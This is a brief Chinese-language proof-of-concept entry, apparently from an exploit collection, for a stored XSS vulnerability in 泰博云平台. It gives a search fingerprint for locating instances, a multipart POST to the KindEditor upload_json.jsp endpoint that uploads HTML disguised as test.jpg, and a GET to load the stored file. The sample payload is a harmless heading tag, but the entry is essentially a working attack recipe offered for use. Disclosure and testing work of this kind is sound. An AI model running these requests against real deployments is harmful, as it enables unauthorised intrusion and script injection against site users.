# 泰博云平台存储型xss漏洞

- **系统**：泰博云平台存储型　|　**类型**：XSS　|　**CVE**：—
- **指纹**：`title="泰博云平台"`
- **请求**：`POST /resources/kindeditor/jsp/upload_json.jsp?dir=image HTTP/1.1`

**请求体 / payload**
```
**1.上传文件**
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6X8r2a9k
------WebKitFormBoundary6X8r2a9k
Content-Disposition: form-data; name="imgFile"; filename="test.jpg"
Content-Type: image/png
<h1>qwcw<h1>

------WebKitFormBoundary6X8r2a9k--
**2.GET 访问上传地址**
GET /这里填第一个响应里的url路径（去掉反斜杠） HTTP/1.1
Host:
```
- **预期**：200　|　—